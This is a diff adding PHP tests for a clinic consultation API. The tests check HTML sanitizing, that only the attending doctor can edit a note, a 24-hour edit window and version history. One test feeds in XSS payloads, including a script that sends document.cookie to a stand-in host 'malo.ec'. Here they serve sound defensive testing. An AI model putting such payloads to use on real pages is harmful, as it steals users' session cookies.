@@ -2185,3 +2185,211 @@ test('el_alta_de_catalogo_ya_no_acepta_lote_ni_caducidad', function () {
     expect($creada)->not->toHaveKey('fecha_caducidad');
     expect($creada['stock_actual'])->toBe(0);
 });
+
+/** Una historia clínica del paciente de la suite. */
+function historiaDePrueba(int $servidorId, string $cedula): HistoriaClinica
+{
+    return HistoriaClinica::create([
+        'numero_historia' => $cedula,
+        'cedula_paciente' => $cedula,
+        'tipo_paciente'   => 'servidor',
+        'servidor_id'     => $servidorId,
+        'estado'          => true,
+    ]);
+}
+
+/** Los datos mínimos que exige el alta de una consulta. */
+function datosDeConsulta(int $historiaId, array $extra = []): array
+{
+    return [
+        'historia_clinica_id'   => $historiaId,
+        'fecha_consulta'        => now()->toDateString(),
+        'hora_consulta'         => now()->format('H:i'),
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'presuntivo',
+        'motivo_consulta'       => 'Dolor abdominal',
+        'diagnostico_detallado' => 'Gastritis aguda',
+        ...$extra,
+    ];
+}
+
+test('el_html_de_la_consulta_se_guarda_limpio', function () {
+    $this->medico->assignRole(Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    ));
+    $this->actingAs($this->medico, 'sanctum');
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    // Lo escribe un editor enriquecido, pero la API acepta cualquier cadena:
+    // sin filtrar, esto se ejecutaba en el navegador del siguiente médico que
+    // abriera la consulta.
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id, [
+            'enfermedad_actual' => '<p>Dolor <strong>agudo</strong></p>'
+                . '<img src=x onerror="alert(1)">'
+                . '<script>fetch("//malo.ec?c="+document.cookie)</script>',
+            'plan_tratamiento'  => '<p onmouseover="alert(2)">Reposo</p>'
+                . '<a href="javascript:alert(3)">enlace</a>',
+        ])
+    )->assertCreated()->json('datos');
+
+    $enBase = App\Models\Dispensario\ConsultaMedica::find($consulta['id']);
+
+    // Se conserva el formato, se va el código.
+    expect($enBase->enfermedad_actual)->toBe('<p>Dolor <strong>agudo</strong></p>');
+    expect($enBase->enfermedad_actual)->not->toContain('script');
+    expect($enBase->enfermedad_actual)->not->toContain('onerror');
+
+    expect($enBase->plan_tratamiento)->not->toContain('onmouseover');
+    expect($enBase->plan_tratamiento)->not->toContain('javascript:');
+    expect($enBase->plan_tratamiento)->toContain('Reposo');
+});
+
+test('el_html_tambien_se_limpia_al_corregir', function () {
+    $this->medico->assignRole(Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    ));
+    $this->actingAs($this->medico, 'sanctum');
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id)
+    )->assertCreated()->json('datos');
+
+    // La corrección es otra puerta de entrada, y tenía que cerrarse igual.
+    $this->patchJson("/api/v1/dispensario/consultas/{$consulta['id']}", [
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'definitivo',
+        'motivo_consulta'       => 'Dolor abdominal',
+        'diagnostico_detallado' => 'Gastritis',
+        'enfermedad_actual'     => '<p>Ok</p><script>alert(1)</script>',
+    ])->assertOk();
+
+    expect(App\Models\Dispensario\ConsultaMedica::find($consulta['id'])
+        ->enfermedad_actual)->toBe('<p>Ok</p>');
+});
+test('solo_quien_atendio_puede_corregir_su_consulta', function () {
+    $rolMedico = Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    );
+    $this->medico->assignRole($rolMedico);
+
+    $otroMedico = App\Models\User::create([
+        'email' => 'wilson@example.com', 'usuario_ti' => 'wilson',
+        'password' => bcrypt('123456'), 'primer_login' => false,
+    ]);
+    $otroMedico->assignRole($rolMedico);
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    $this->actingAs($this->medico, 'sanctum');
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id)
+    )->assertCreated()->json('datos');
+
+    // Otro médico no reescribe la nota de un colega. Hasta ahora podía, sobre
+    // cualquier paciente y sin dejar rastro; el odontograma de al lado ya
+    // exigía ser quien registró el procedimiento.
+    $this->actingAs($otroMedico, 'sanctum');
+    $this->patchJson("/api/v1/dispensario/consultas/{$consulta['id']}", [
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'definitivo',
+        'motivo_consulta'       => 'Otra cosa',
+        'diagnostico_detallado' => 'Otro diagnostico',
+    ])->assertStatus(403);
+
+    // Y la consulta quedó como estaba.
+    $enBase = App\Models\Dispensario\ConsultaMedica::find($consulta['id']);
+    expect($enBase->diagnostico_detallado)->toBe('Gastritis aguda');
+    expect($enBase->versiones()->count())->toBe(0);
+});
+
+test('la_consulta_deja_de_poder_corregirse_pasadas_las_horas', function () {
+    $this->medico->assignRole(Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    ));
+    $this->actingAs($this->medico, 'sanctum');
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id)
+    )->assertCreated()->json('datos');
+
+    // Corregir un rato después sigue valiendo: es lo que pasa cuando el médico
+    // se da cuenta de una errata con el paciente todavía delante.
+    $this->travel(2)->hours();
+    $this->patchJson("/api/v1/dispensario/consultas/{$consulta['id']}", [
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'definitivo',
+        'motivo_consulta'       => 'Dolor abdominal',
+        'diagnostico_detallado' => 'Gastritis aguda confirmada',
+    ])->assertOk();
+
+    // Al día siguiente ya no: eso no es corregir, es reescribir el pasado. Lo
+    // que corresponde es una consulta nueva.
+    $this->travel(25)->hours();
+    $this->patchJson("/api/v1/dispensario/consultas/{$consulta['id']}", [
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'definitivo',
+        'motivo_consulta'       => 'Dolor abdominal',
+        'diagnostico_detallado' => 'Ulcera',
+    ])->assertStatus(422);
+
+    expect(App\Models\Dispensario\ConsultaMedica::find($consulta['id'])
+        ->diagnostico_detallado)->toBe('Gastritis aguda confirmada');
+});
+
+test('corregir_una_consulta_archiva_lo_que_decia_antes', function () {
+    $this->medico->assignRole(Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    ));
+    $this->actingAs($this->medico, 'sanctum');
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    $cie10 = App\Models\Dispensario\DiagnosticoCie10::first();
+
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id, [
+            'diagnostico_cie10_id'     => $cie10?->id,
+            'diagnosticos_secundarios' => $cie10 ? [$cie10->id] : [],
+            'plan_tratamiento'         => '<p>Omeprazol 20mg</p>',
+        ])
+    )->assertCreated()->json('datos');
+
+    $this->patchJson("/api/v1/dispensario/consultas/{$consulta['id']}", [
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'definitivo',
+        'motivo_consulta'       => 'Dolor abdominal',
+        'diagnostico_detallado' => 'Ulcera gastrica',
+        'plan_tratamiento'      => '<p>Omeprazol 40mg</p>',
+    ])->assertOk();
+
+    // La versión anterior queda entera, con quién la reemplazó.
+    $versiones = $this->getJson(
+        "/api/v1/dispensario/consultas/{$consulta['id']}/versiones"
+    )->assertOk()->json('datos');
+
+    expect($versiones)->toHaveCount(1);
+    expect($versiones[0]['diagnostico_detallado'])->toBe('Gastritis aguda');
+    expect($versiones[0]['tipo_diagnostico'])->toBe('presuntivo');
+    expect($versiones[0]['plan_tratamiento'])->toBe('<p>Omeprazol 20mg</p>');
+    expect($versiones[0]['reemplazada_por'])->toBe($this->medico->id);
+
+    if ($cie10) {
+        expect($versiones[0]['diagnosticos_secundarios'])->toBe([$cie10->id]);
+    }
+
+    // Y la vigente es la nueva.
+    expect(App\Models\Dispensario\ConsultaMedica::find($consulta['id'])
+        ->diagnostico_detallado)->toBe('Ulcera gastrica');
+});
+
